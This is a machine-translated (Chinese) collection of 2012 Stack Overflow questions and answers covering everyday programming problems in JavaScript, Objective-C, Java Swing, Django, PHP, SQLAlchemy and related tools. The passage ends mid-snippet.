第二种方法的好处是您可以更准确地控制输出，并且您不必编写绘制树的复杂代码。只是生成数据结构的简单代码。

例如，如果您专门处理[二叉树](http://en.wikipedia.org/wiki/Binary_tree)，那么您可以通过这种方式随机创建二叉树（伪代码）：

```
function createRandomBinaryTree(aLevel):
if aLevel<4:
   thisNode = new(Node("someRandomLabel"))
   leftNode = Null
   rightNode = Null
   if random()>0.5:
      leftNode = createRandomBinaryTree(aLevel+1)
   else:
      rightNode = createRandomBinaryTree(aLevel+1)
   if leftNode!=Null:
      thisNode.leftNode = leftNode
   if rightNode!=Null:
      thisNode.rightNode = rightNode
   return thisNode
else return Null 
```

在这种情况下，您有一个非常简单的数据结构，它由一个 Node 表示，它有两个指向其他两个节点的指针（这里称为 left 和 right）。

（例如 Node = {"label":"Root","left":{"label":"RootLeft","left":{},"right":{}},"right":{"label" :"Root","RootRight":{},"right":{}}}）

然后，您可以使用[sigmaJS](http://sigmajs.org/)（或[Raphael](http://raphaeljs.com/)或[D3](http://mbostock.github.com/d3/ex/force.html)或其他任何东西）为您处理画布中的实际渲染。

用于生成此类渲染的不同 Javascript 库将有自己的内部格式来表示上面提到的“节点”，因此必须稍微调整伪代码（无论如何，这不是随机生成二叉树的唯一方法）。

我希望这有帮助。

# iphone - 在异步请求期间过早释放的变量

> ID：10347951
> 
> 赞同：0
> 
> 时间：2012-04-27T09:14:15.657
> 
> 标签：iphone, objective-c, memory-management

我的内存管理和线程知识非常有限，所以我可能遗漏了一些非常基本的东西。我已经找到了解决这个问题的方法，但它真的非常困扰我，我看不到正在发生的事情。

我有一个类发出两个异步 HTTP 请求，一个用于 XML 配置文件，另一个用于图像。因为在同一个类中有两个异步请求，所以我重用了相同的`NSURLConnectionDelegate`方法（也许是因素）。我首先异步获取配置文件并提取两个 url，存储为`sponsorImage`和`sponsorUrl`. 然后我使用 的值`sponsorImage`来异步获取图像数据。不过，我发现，在我获得图像之后（在第二个异步事件完成之后），`sponsorUrl`已经发布了。

我意外地发现，`sponsorUrl`如果我在创建图像请求的方法中“对它做某事”，我可以防止被释放——我的意思是“做某事”。基本上，我的代码如下所示：

```
- (void) loadImage
{
    sponsorUrl = [sponsorUrl stringByAppendingString:@""];

    NSURL *url = [NSURL URLWithString:sponsorImage];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setValue:dateString forHTTPHeaderField:@"If-Modified-Since"];

    NSURLConnection *connection = [[NSURLConnection alloc] initWithRequest:request delegate:self];
    [connection start];
    [connection release];   
} 
```

如果我删除此方法的第一行（我在 url 中添加“”），则保留该变量。如果我删除它，它就会被释放。这对我来说毫无意义。

我试过`sponsorUrl`用`@propterty (nonatomic, retain)`;声明 我试过`sponsorUrl`静态声明；我已经尝试添加`[sponsorUrl retain]`我设置它的位置，但它没有任何区别。唯一有效的是在发出第二个请求之前“触摸”变量。

我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:24:03.450

当您使用便利构造函数时，变量是自动释放的！仅当您使用诸如 alloc、copy 或 new 之类的方法时，它们才会被隐式保留。

其次，通过编写赞助商Url = ...。您不是使用生成的setter，而是使用生成的实例变量。你需要写 self.sponsorUrl = @"Blah"; 或 [self setSponsorUrl:@"blah"] 以便让 setter 保留变量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:25:45.543

确实，您似乎在内存管理方面遇到了一些问题。

很难解释发生了什么，因为您没有提供使用变量的完整代码。举个例子，拿下面的语句：

```
sponsorUrl = [sponsorUrl stringByAppendingString:@""]; 
```

您所做的是分配`sponsorURL`一个新值；旧值（你首先初始化变量的那个，即`retain`你提到的那个）被释放（`stringByAppendingString`伪造一个新对象）；指向的新对象`sponsorURL`是一个自动释放的对象，其生命周期并不完全清楚：我们只知道它会在某个时候被释放（可能在下一次主循环迭代时）。因此，通过“触摸”变量，您正在为其分配一个新值，该值的生命周期从您触摸变量的点开始......无论如何都是非常不可靠的。

我的建议如下：

1.  在你的类中定义两个属性来处理`sponsorURL`和`sponsorImage`;

2.  使他们成为`retain`那种人；

3.  仅通过它们的访问器方法为它们赋值，即 self.sponsorURL = [...]

4.  确保您分配给属性的任何对象都是`autoreleased`对象（或者，使用分配进行释放）。

如果您提供更多代码，则可以更彻底地审查它，但如果您遵循上述指南，您将完全没有问题（大约...）

# python - Django Python 同步数据库 SQL

> ID：10347952
> 
> 赞同：0
> 
> 时间：2012-04-27T09:14:18.607
> 
> 标签：python, sql, database, django, django-models

我正在使用几个不同的应用程序设置一个 Django 项目，但是我在将[django 分类 ap](https://github.com/saebyn/django-classifieds)添加到我的其他应用程序结构时遇到了问题。当我运行 syncdb 时，我的数据库中只创建了来自应用程序 1 和 2 的 models.py，而不是分类应用程序的表。当我访问它读取的页面时

```
DatabaseError at /create
(1146, "Table 'mydb.classifieds_pricing' doesn't exist") 
```

因为表不是由syncdb创建的。对我有什么想法吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:46:18.537

确保`classifieds`在`INSTALLED_APPS`您的`settings.py`

# javascript - 如何选择没有第一个图像的所有图像？

> ID：10347958
> 
> 赞同：4
> 
> 时间：2012-04-27T09:14:43.557
> 
> 标签：javascript, jquery

我有以下问题。下载了一个脚本，它正在从 div 的正文中加载所有图像。我想在此处再添加一张图像，该图像不会被脚本处理。

在代码中是这样的：

```
<div id="myGallery0" class="spacegallery">
<img src=ADDITIONAL.jpg alt="" atr1="1" />  
<img src=images/bw1.jpg alt="" atr1="1" />
<img src=images/bw2.jpg alt="" atr1="2" />
<img src=images/bw3.jpg alt="" atr1="3" />
</div> 
```

所以我的问题是，如何在 jquery 中选择除“ADDITIONAL.jpg”之外的所有这些图像？

我的第二个问题是如何使用 GetElementsBy 函数之一在自然 JavaScript 中选择它。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T09:16:08.953

您可以使用`:not()`伪和`:first`选择器的组合：

```
var $images = $('#myGallery0').find('img:not(:first)'); 
```

我猜我的香草 js 解决方案与 HTML5 一起看起来像：

```
var images = document.getElementById('myGallery0').querySelectorAll('img');

images = Array.prototype.filter.call(images, function( node, idx ) {
    return idx > 0;
}); 
```

* * *

更新：

我也同意在这个特定的例子中，jQuery`.slice(1)`更性感（也更快），也就是说

```
var $images = $('#myGallery0 img').slice(1); 
```

但这仅在您切割第一个项目时才有效。使用这些伪选择器，您还可以轻松删除，比如说第二个节点，比如 using `img:not(:eq(1))`。虽然这也是可能的`.slice()`，但这样做会变得更加棘手。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-27T09:21:25.340

### 原始 JavaScript

原始 JavaScript 版本使用[`document.getElementById`](http://www.w3.org/TR/DOM-Level-2-Core/core.html#ID-getElBId)然后[`Element#getElementsByTagName`](http://www.w3.org/TR/DOM-Level-2-Core/core.html#ID-1938918D)跳过第一个：

```
var list, images = [], index;
list = document.getElementById("myGallery0").getElementsByTagName("img");
for (index = 1; index < list.length; ++index) {
    images.push(list[index]);
}
// Use the `images` array 
```

开始循环`index = 1`跳过第一个（这将是`index = 0`）。

或者你可能会变得非常棘手，但我会在你的目标浏览器上彻底测试它：

```
var images = Array.prototype.slice.call(
    document.getElementById("myGallery0").getElementsByTagName("img"),
    1); 
```

这是有效的，因为根据规范，**必须**允许它使用的对象不是数组，只要它支持方法规范中列出的操作。并且返回的确实如此，因此我们可以调用将其作为值传递并告诉它我们想要一个从索引 1 开始的切片。但请注意，规范也很清楚地表明*“......该**函数是否可以成功应用于主机对象是依赖于实现的。”* 并且是主机提供的对象，因此建议在您的目标环境中进行彻底测试。[`Array.prototype.slice`](http://es5.github.com/#x15.4.4.10) **`slice``NodeList``getElementsByTagName``slice``NodeList``this`*`slice`*`NodeList`**

 **### jQuery

在 jQuery 中，有很多方法可以做到这一点。我最喜欢的可能是[Rui 指出的那个](https://stackoverflow.com/a/10348030/157247)，使用[`slice`](http://api.jquery.com/slice/)：

```
var images = $("#myGallery0 img").slice(1); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-27T09:19:16.093

只是另一种选择：

```
$('#myGallery0 img').slice(1) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T09:22:59.867

您可以使用该[`slice`方法](http://api.jquery.com/slice/)获取结果的一部分：

```
$('#myGallery0 img').slice(1) 
```

普通的 Javascript 版本将是类似的，有一个技巧将元素集合转换为数组：

```
Array.prototype.slice.call(
  document.getElementById('myGallery0').getElementsByTagName('img')
).slice(1) 
```**

# javascript - IE中“启用本机XMLHTTP支持”选项的目的是什么

> ID：10347963
> 
> 赞同：7
> 
> 时间：2012-04-27T09:14:56.143
> 
> 标签：javascript, ajax, internet-explorer, memory-leaks, xmlhttprequest

我们的网站使用 AJAX 调用并用于`XMLHTTPRequest`实现这一目标。当客户端整天使用单个 IE 实例并在该 IE 中多次导航和重新访问页面时，我们最终会出现内存不足异常并被迫关闭 IE。

通过启用`Enable native XMLHTTP support`IE 的高级选项卡中的选项可以解决此问题。由于我们更喜欢原生 XMLHTTP 对象而不是 ActiveXObject，因此异常可能是由于使用 ActiveXObject 引起的。但仍然不确定根本原因是什么，或者是否有其他更好的方法来解决问题。我们使用 IE8。我们从未在其他浏览器（Firefox 和 chrome）中遇到过此类问题。谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T09:22:07.823

启用原生 XMLHTTP 支持意味着浏览器不会提供 MSXML.HttpRequest 而是提供符合标准的 window.XMLHttpRequest。然而，我们成功地使用了这两个版本而没有任何泄漏，所以我想这一定是您的代码中的一些实现问题 - 我只是在猜测，但是将 MSXML.HttpRequest 实例固定在 DOMNodes 上（通过事件监听器）可能会导致这种情况。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T09:30:43.967

"Enable native XMLHTTP support” option in IE, unsurprisingly, makes IE provide native support for XMLHTTPRequest. If you don't enable this, you'll only have legacy ActiveX binding to MSXML library in IE. I guess you use some library that provides cross-browser handling for cases where native support is absent (setting turned off or older IE that only have legacy interface) or manually fallback to MSXML. Since MSXML binding is an alien interface for JavaScript, there are many places where objects introduced from outside JS can form cross-references with native objects, not letting either JS or ActiveX garbage collector to reclaim them, since they don't communicate and can't find such circular references.

Best solution, in my opinion, is to recommend IE7 users to always have this option on (there's really zero drawbacks to it) and just forget about older browsers. If this is not an option somehow, try recursively clear all MSXML objects you create in your fallback code.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-27T09:27:16.313

本质上，由于 HTML DOM、JavaScript 执行引擎和 XMLHTTPRequest 对象之间的循环引用，您正在泄漏 XMLHTTPRequest 对象。

当请求完成时，您需要解开事件并取消对 XMLHttp 对象的引用。（要取消引用它们，请确保没有 JavaScript 对象或变量引用它们，包括 onClick 处理程序中的少量脚本等。

启用原生 XMLHTTPRequest 意味着将外部组件从循环中取出，因此 DOM 能够自行管理请求的生命周期。

另请参阅@PeterAronZentai 的回答。

# c# - 实体框架如何将文本框绑定到 Windows 窗体中的模型

> ID：10347979
> 
> 赞同：0
> 
> 时间：2012-04-27T09:16:14.683
> 
> 标签：c#, winforms, entity-framework, linq-to-entities, linq-to-objects

在 Windows 窗体项目中使用实体数据模型，我想同时将 Orders 实体绑定到 datagridview 和 textBox，并且 textBox 必须根据数据网格中的当前行显示 OrderID 值。

接下来是我在表单加载事件中使用的代码：

```
 using(NorthwindEntities context = new NorthwindEntities())
    {
    ordersDataGridView.DataSource = context.Orders;
    OrderNumberTextBox.   ...
    } 
```

对于这种情况，绑定 Textbox 的正确语法是什么？谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T11:14:18.963

绑定一个`BindingSource`对象到你的`context.Orders`，绑定你`DataGridView`的`BindingSource`，然后通过[`TextBox.DataBindings`](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.databindings.aspx)属性，绑定你的适当的属性`TextBox`到你的`BindingSource`。[BindingSource](http://msdn.microsoft.com/en-us/library/h974h4y2.aspx)对象将管理货币状态，因此当您在 DataGridView 中选择不同的项目时，TextBox 会发生变化。

绑定看起来类似于以下内容：

```
OrderNumberTextBox.DataBindings("Text", bindingSource, "OrderID"); 
```

# java - 在 JTable 中使 JButton 可点击

> ID：10347983
> 
> 赞同：28
> 
> 时间：2012-04-27T09:16:22.673
> 
> 标签：java, swing, jtable, jbutton

这是我想要做的截图：

![在此处输入图像描述](../Images/87846b58315608bc2c567c5d55a456fe.png)

那里发生的事情是 JButton 正确显示，但是当我单击它时没有任何反应。经过一番搜索，我发现`Object`返回的`table.getValueAt()`是 String 而不是 JButton...

这是代码：

```
tblResult = new JTable(data,cols) {
    public TableCellRenderer getCellRenderer( int row, int column ) {
        return new ClientsTableRenderer();
    }
}; 
```

我使用它在运行时填充 JTable :(`tblResult`现在是`Clients.rblResult`)

```
SwingUtilities.invokeLater( new Runnable() {
    public void run() { 

        DefaultTableModel aModel = new DefaultTableModel() {
            //setting the jtable read only
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }               
        };

    String[] cols = {"N°","Société", "TVA", "CP", "Ville", ""};
    aModel.setColumnIdentifiers(cols);

    Object[] temp = new Object[6];
    for(int i=0;i<result.length;i++) {

        temp[0] = result[i].custNumber;
        temp[1] = result[i].name;
        temp[2] = result[i].tva;
        temp[3] = result[i].cp;
        temp[4] = result[i].city;
        temp[5] = "Consulter";

        aModel.addRow(temp);

    }

    Clients.tblResult.setModel(aModel);

    Clients.tblResult.addMouseListener(new JTableButtonMouseListener(Clients.tblResult));
    }}  
); 
```

这里的`ClientsTableRenderer`类

```
public class ClientsTableRenderer extends JPanel implements TableCellRenderer {
    @Override
    public Component getTableCellRendererComponent( final JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
        setBackground(Color.WHITE);
        if(column < 5) {
            JLabel label =  new JLabel(value.toString());
            JPanel panel = new JPanel(new FlowLayout(FlowLayout.CENTER,0,9));
            panel.setBackground(Color.WHITE);
            panel.add(label);
            this.add( panel);
        } else {

            JButton button = new JButton(value.toString());
            button.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent arg0) {
                    System.out.println("Clicked !");
                }
            });
            JPanel panel = new JPanel(new FlowLayout(FlowLayout.CENTER,0,3));
            panel.setBackground(Color.WHITE);
            panel.add(button);
            this.add(panel);
        }

        return this;
    }

} 
```

最后， JTableButtonMouseListener() ：

```
public class JTableButtonMouseListener extends MouseAdapter {
      private final JTable table;

      public JTableButtonMouseListener(JTable table) {
        this.table = table;
      }

      @Override public void mouseClicked(MouseEvent e) {
        int column = table.getColumnModel().getColumnIndexAtX(e.getX());
        int row    = e.getY()/table.getRowHeight(); 
        System.out.println("Col :"+column + "row:"+row);

        if (row < table.getRowCount() && row >= 0 && column < table.getColumnCount() && column >= 0) {
          Object value = table.getValueAt(row, column);
          System.out.println("Value :"+value.getClass().getName());
          if (value instanceof JButton) {
            ((JButton)value).doClick();
          }

        }
      }
    } 
```

我是Java的新手，非常感谢您的帮助:)

提前致谢 ！

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-27T09:43:13.313

这个来自 Rob Camick 的[表格按钮列可能适合您的需求。](http://tips4java.wordpress.com/2009/07/12/table-button-column/)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-04-27T09:41:12.270

问题是`JButton`在表格中绘制时不再存在。这些组件仅用于在呈现表格时创建“印章”。没有实际的按钮。

有一种方法可以让您单击按钮，并且*仍然保持表格不可编辑*，但这与正确的代码相去甚远。只是一个可能的解决方案的简要概述（我现在没有时间给出完整的代码示例）

*   将鼠标侦听器附加到表格
*   当您收到鼠标点击时，确定发生鼠标点击的单元格
*   向表格渲染器询问该单元格的组件
*   使用鼠标单击的位置来确定按钮是否存在于上一步的组件中的特定位置
*   如果是这样，请通过按钮 api 进行单击（`doClick`方法）

这甚至不是代码的脏部分。由于您的渲染器（希望）不会`JButton`每次都返回一个新的，您应该在您的`ActionListener`哪个附加到`JButton`跟踪实际发生点击的组件。一种可能的解决方案是保留对您上次创建的表模型值的引用`JButton`（因此在`getCellRendererComponent`方法中跟踪行/列），但我不确定这是否是最佳方法。

如前所述，一个可能的解决方案，但远非优雅。

正如其他答案中所指出的那样，最简单的方法是使一列可编辑并使用编辑器

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-04-27T10:23:27.067

试试这个：

```
import java.awt.Color;
import java.awt.Component;
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.DefaultCellEditor;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.UIManager;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableModel;

public class TableWithButtonDemo
{
  private JFrame frame = new JFrame("Table Demo");
  private String[] columnNames = { "String", "Integer", "Float", "" };
  private Object[][] data = { { "Dummy", new Integer(12), new Float(12.15), "Consulter" } };
  private TableModel model = new DefaultTableModel(data, columnNames)
  {
    private static final long serialVersionUID = 1L;

    public boolean isCellEditable(int row, int column)
    {
      return column == 3;
    }
  };
  private JTable table = new JTable(model);

  public TableWithButtonDemo()
  {
    table.getColumnModel().getColumn(3).setCellRenderer(new ClientsTableButtonRenderer());
    table.getColumnModel().getColumn(3).setCellEditor(new ClientsTableRenderer(new JCheckBox()));
    table.setPreferredScrollableViewportSize(table.getPreferredSize());
    table.setShowHorizontalLines(true);
    table.setShowVerticalLines(false);

    JScrollPane scroll = new JScrollPane(table);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.add(scroll);
    frame.pack();
    frame.setLocation(150, 150);
    frame.setVisible(true);
  }

  public static void main(String[] args) throws Exception
  {
    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
    EventQueue.invokeLater(new Runnable()
    {
      public void run()
      {
        new TableWithButtonDemo();
      }
    });
  }

  class ClientsTableButtonRenderer extends JButton implements TableCellRenderer
  {
    public ClientsTableButtonRenderer()
    {
      setOpaque(true);
    }

    public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column)
    {
      setForeground(Color.black);
      setBackground(UIManager.getColor("Button.background"));
      setText((value == null) ? "" : value.toString());
      return this;
    }
  }
  public class ClientsTableRenderer extends DefaultCellEditor
  {
    private JButton button;
    private String label;
    private boolean clicked;
    private int row, col;
    private JTable table;

    public ClientsTableRenderer(JCheckBox checkBox)
    {
      super(checkBox);
      button = new JButton();
      button.setOpaque(true);
      button.addActionListener(new ActionListener()
      {
        public void actionPerformed(ActionEvent e)
        {
          fireEditingStopped();
        }
      });
    }
    public Component getTableCellEditorComponent(JTable table, Object value, boolean isSelected, int row, int column)
    {
      this.table = table;
      this.row = row;
      this.col = column;

      button.setForeground(Color.black);
      button.setBackground(UIManager.getColor("Button.background"));
      label = (value == null) ? "" : value.toString();
      button.setText(label);
      clicked = true;
      return button;
    }
    public Object getCellEditorValue()
    {
      if (clicked)
      {
        JOptionPane.showMessageDialog(button, "Column with Value: "+table.getValueAt(row, 1) + " -  Clicked!");
      }
      clicked = false;
      return new String(label);
    }

    public boolean stopCellEditing()
    {
      clicked = false;
      return super.stopCellEditing();
    }

    protected void fireEditingStopped()
    {
      super.fireEditingStopped();
    }
  }

} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-27T09:52:26.700

本文提供了一种更简单的方法来解决您的问题，而无需添加 MouseListener 并计算单击是否实际在按钮上：

[http://web.archive.org/web/20100623105810/http://ivolo.mit.edu/post/A-Simple-Pattern-for-Embedding-Components-into-a-Swing-JTable.aspx](http://web.archive.org/web/20100623105810/http://ivolo.mit.edu/post/A-Simple-Pattern-for-Embedding-Components-into-a-Swing-JTable.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-05-11T21:21:37.737

重载您的 Table 模型，并为带有按钮的单元格设置 isCellEditable(int, int) return false。

它非常适合添加到表中的 MouseListener。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-07-21T13:28:15.770

这是我的解决方案

**按钮编辑器.java**

```
public abstract class ButtonEditor extends DefaultCellEditor implements ActionListener {
private static final long serialVersionUID = 1L;

/** The cell's row. */
protected int row;

/** The cell's column. */
protected int column;

/** The cell's column. */
protected JTable table;

/** The button we are editing. */
protected JButton button;

/** The panel used when editing. */
protected JPanel panel = new JPanel(new GridBagLayout());

/** Constructor */
public ButtonEditor() {super(new JCheckBox());}

/**
 * This method is called when the user try to modify a cell. 
 * In this case it will be called whenever the user click on the cell.
 * @param table
 * @param value
 * @param isSelected
 * @param row
 * @param column
 * @return JPanel The JPanel returned contains a JButton with an ActionListener. 
 */
@Override
public Component getTableCellEditorComponent(JTable table, Object value, boolean isSelected, int row, int column) { 
    this.row = row;
    this.column = column;
    this.table = table;
    button = (JButton) value;

    //prevent to add the action listener everytime the user click on the cell.
    if(button.getActionListeners().length == 0) button.addActionListener(this); 

    panel.add(button);
    panel.setBackground(table.getGridColor());
    return panel;
}

/**
 * Return a renderer for JButtons. The result is a button centered in the table's cell.
 * @return
 */
public static TableCellRenderer getRenderer() {
    return new TableCellRenderer() {
        @Override
        public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
            JPanel panel = new JPanel(new GridBagLayout());
            panel.add((JButton) value);
            panel.setBackground(table.getGridColor());
            return panel;
        }
    };
} 
```

}

以下是如何使用它：

**演示.java**

```
 table.setDefaultRenderer(JButton.class, ButtonEditor.getRenderer()); 
    table.setDefaultEditor(JButton.class, new ButtonEditor() {
        @Override
        public void actionPerformed(ActionEvent e) {

            //handle clicks here. for example:   
            if(column == 5) {
                System.out.Println(row);
                button.setFocusPainted(false);                  
            }
        }
    }); 
```

# php - 在 PHP 中从 WSDL 自动生成 SOAP 请求

> ID：10347984
> 
> 赞同：1
> 
> 时间：2012-04-27T09:16:23.777
> 
> 标签：php, soap, wsdl

我已经搜索了很多代码片段来自动生成基于 PHP 中的 WSDL 的 SOAP 请求。

我们有一个第 3 方供应商为我们创建了一个巨大的 WSDL（+ 相关 Web 服务），我真的很想根据该 WSDL 在 PHP 中自动生成一些 SOAP 请求。我知道 SOAPUI 等特定于应用程序的工具 - 但是 - 我更喜欢直接在 PHP 代码中进行单元测试。

你知道任何基于 WSDL 自动生成 SOAP 请求的 PHP 库吗？或者更好的是，您是否有一些代码可以自动生成 SOAP 请求？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T12:26:48.907

使用 apigenerator.com 生成肥皂请求

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-23T05:22:47.530

我建议你使用 zend 框架的肥皂组件。

例如，您只需使用以下命令设置一个肥皂客户端：

```
$client = new Zend_Soap_Client("url to wsdl file");

//Then you can do what ever request to the server.

$client->helloWorld("Parameter'); 
// In this example i guess helloWolrd is a server function. 
```

最后你可以调用 xml 肥皂请求：

```
$request = $client->getLastRequest(); 
```

只是做：回声$请求；你会看到数据。

**请记住将 mime 代码更改为 xml，以便您可以在浏览器中看到 xml。**

# java - appengine 动态实例的问题

> ID：10347985
> 
> 赞同：1
> 
> 时间：2012-04-27T09:16:24.957
> 
> 标签：java, google-app-engine

我有一个类在我的应用程序首次启动时执行某些操作（初始化）。此初始化代码存在于静态块中。因此，通常应该在类第一次加载时只执行一次。

现在，当问题是当我的服务器没有请求时我的实例是动态的时，我的应用程序会被卸载。所以下次当请求到来时，应用程序会动态加载并且初始化代码再次运行。这就是我不想要的。

我知道这个问题可以通过使用常驻实例来解决。但我猜常驻实例在免费配额中不可用。如果我错了，请纠正我。

有什么办法可以让我摆脱这个问题？

将计算结果存储在 db 中是一种选择，但它不可行，因为我想要快速获取数据？memchace 怎么样？它会工作吗？memchace 中的数据是否会在我的应用程序的动态加载中保存？注意：我没有明确卸载我的实例，但是当我的应用程序没有收到任何请求时，应用程序引擎会这样做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T16:19:43.043

或者您可以安排一个每 10 分钟定期运行的任务，该实例将保持加载状态。（确保开启线程安全）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T15:08:35.150

Memcache 数据随时可能消失。只有数据存储数据才能保证是持久的。

您可以存储初始化数据并按顺序获取它：

1.  静态数据成员（？）
2.  内存缓存数据
3.  数据存储数据

（这就是我所做的）如果你不想接受尼克的建议。

# mysql - sqlalchemy - 在 MySQL 中按月选择记录

> ID：10347986
> 
> 赞同：2
> 
> 时间：2012-04-27T09:16:29.437
> 
> 标签：mysql, datetime, select, sqlalchemy

当我在 MySQL 中有一张表时：

```
create table t
(
    id integer primary key,
    time datetime not null,
    value integer not null
) 
```

和一个映射类：

```
class T(Base):
    __tablename__ = 't'

    id = Column(INTEGER, primary_key=True, nullable=False, unique=True)
    time = Column(DATETIME, nullable=False)
    value = Column(INTEGER, nullable=False) 
```

如何使用 SQLAlchemy 从该表中选择所有给定月份的值？MySQL 有`month`功能：`select value from t where month(time) = 4` 但 SQLAlchemy 没有`month`功能。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-30T15:48:41.920

无需将所有`T`s 加载到会话中，就可以直接使用[Functions](http://docs.sqlalchemy.org/en/latest/core/tutorial.html#functions)过滤非 April 对象：

```
from sqlalchemy.sql import func
qry = session.query(T).filter(func.MONTH(T.time) == 4)
for t in qry:
    print t.value 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-07-26T20:16:58.370

一个非常古老但更好的答案在这里：

```
from sqlalchemy import extract  

session.query(T).filter(extract('month', T.time)==7).all() 
```

这将在 7 月将所有记录返回到数据库中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-29T10:36:54.773

例如，如果您想要所有 4 月份的记录，而不考虑年份或日期：

```
for t in session.query(T):
    if t.time.month == 4: print t.value 
```

# image - 什么是几何图像？

> ID：10347987
> 
> 赞同：1
> 
> 时间：2012-04-27T09:16:34.027
> 
> 标签：image, 3d, geometry, mesh, parameterization

什么是几何图像以及如何创建它们？这有点奇怪......我需要从网格模型创建几何图像，反之亦然。

[示例几何图像 + 法线贴图](http://i.stack.imgur.com/SqAR0.jpg)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T11:28:43.253

几何图像是一种编码形状的方式。[本文](http://research.microsoft.com/en-us/um/people/hoppe/gim.pdf)对它们进行了介绍。

引用引言：

> [几何图像] 将几何捕获为 [x, y,z] 值的简单 n × n 数组。其他表面属性，例如法线和颜色，存储为附加的方形图像，与几何图形共享相同的域。因为几何和属性共享相同的参数化，参数化本身是隐式的——“纹理坐标”不存在。此外，这种参数化充分利用了纹理域（没有浪费空间）。几何图像可以使用传统的图像压缩算法进行编码，例如基于小波的编码器。此外，几何图像非常适合硬件渲染。它们可以像纹理图像一样以压缩形式传输到图形管道。而且，它们消除了昂贵的基于指针的结构，例如索引顶点列表。

# sqlite - SQLite 上的图表是如何制作的？

> ID：10347989
> 
> 赞同：1
> 
> 时间：2012-04-27T09:16:37.597
> 
> 标签：sqlite, graph, grammar

> **可能重复：**
> [用于生成 json.org 上使用的铁路图的工具](https://stackoverflow.com/questions/796824/tool-for-generating-railroad-diagram-used-on-json-org)

SQLite 在他们的网站上有一些很棒的图表显示语言的语法，有人知道这些是如何制作的吗？

![在此处输入图像描述](../Images/a4da2e2b76cbb4f3dba73a6e0769fc1d.png)

有没有从语法生成图表的工具？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T10:10:54.583

这个例子看起来很像一个有限自动机——即正则表达式的图形等价物。如果您可以将您的语法表示为 RE（自然，并非所有语法都可以表示为 RE！），您可以使用[Kleene 定理](http://www.cs.odu.edu/~toida/nerzic/390teched/regular/fa/kleene-1.html)将其转换为 FA 图。

请注意，RE 所讨论的字母表不是单个字母，而是单词和标记。在上面的示例中，对应的 RE 如下所示：

```
DELETE FROM qualified-table-name
(WHERE expr|())   /* "WHERE expr" is optional; the alternative branch is the empty expression "()" */
(
    (ORDER BY ordering-term (, ordering-term)*|())   /* ", ordering-term" may be repeated */
    LIMIT expr ((OFFSET|,) expr|())   /* can use "OFFSET" or "," */
|()
) 
```

这转化为与您的图表非常相似的 FA。 [GraphViz](http://www.graphviz.org)将完成清晰的绘制工作。

![FA 用于上述 RE](../Images/51deeb247f0c4e946ecd58d8e4478fb5.png)

然而这和原来的不太一样，是吗？很好地呈现它是下一个挑战。我建议采用嵌套的 RE 表达式并递归地渲染它们，从叶子开始。

例如，要渲染`(WHERE expr|())`：

1.  两条备用路径。分别渲染：
    1.  渲染`WHERE expr`：
        1.  渲染`WHERE`为盒子。
        2.  然后是一箭。
        3.  然后渲染`expr`为一个盒子。
    2.  渲染`()`为单个箭头。
2.  找到最长的（第一个）并拉伸其他的以匹配它。
3.  在每一端创建开始和结束节点。
4.  绘制从开始节点到每个子部分的连接边，然后从每个子部分到结束节点。

以图形方式执行此操作意味着跟踪框的大小和位置，包括不可见的框。每个子部分周围都有一个不可见的框。关于递归结构，需要注意三点：

1.  零件的*大小*取决于其子项的大小。
2.  子部件的*位置*取决于其父部件的位置。
3.  一切的位置（可能）取决于其他一切的大小。

这意味着您应该首先从底部开始计算每个部分的大小。然后，一旦你知道根的大小，你就可以开始定位部件，自上而下。

# php - SQL 书写格式

> ID：10347990
> 
> 赞同：0
> 
> 时间：2012-04-27T09:16:40.453
> 
> 标签：php, sql

我想像这样使用 sql 内部连接到表：

```
$check_unscored =   "select * from [user]

            INNER JOIN [tenderrc]
            on [user].[id] = [tenderrc].[userid]";

$result_unscored = mssql_query($check_unscored, $s);

while ($record_unscored = mssql_fetch_array($result_unscored))
{
$id = $record_unscored['id'];
